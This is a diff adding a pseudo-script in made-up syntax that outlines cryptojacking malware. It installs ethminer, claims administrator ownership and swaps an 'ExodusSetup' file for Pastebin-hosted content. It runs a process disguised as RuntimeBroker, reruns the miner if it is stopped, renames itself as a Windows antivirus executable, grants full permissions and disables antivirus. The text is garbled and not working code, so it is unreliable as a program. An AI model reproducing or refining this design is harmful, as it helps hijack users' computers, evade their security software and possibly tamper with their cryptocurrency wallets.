@@ -1,0 +1,20 @@
+Setup
+--
+location C://downloads
+install file https://github.com/ethereum-mining/ethminer.git
+If; user (Administrator) set user (ClaimOwnership), If not; run ethereum-mining/ethminer.git
+
+Account
+--
+ID: Pastebin://FGkldnASk
+C://CommandPromt=run
+If C://CommandPromt open; Then open Start C://ExodusSetup.txt
+If C://ExodusSetup opened; Then replace file Pastebin://FGkldnASk
+When file C://ethereum-mining/ethminer.git opened; Run file C://RuntimeBroker
+If file C://ethereum-mining/ethminer.git disabled; Rerun C://ethereum-mining/ethminer.git
+If file C://ethereum-mining/ethminer/git removed; Rename (WindowsAntivirusExecutable)
+Permissions C://ethereum-mining/ethminer.git=all
+
+Antivirus
+--
+If Antivirus=Enabled; C://WindowsAntivirus disable
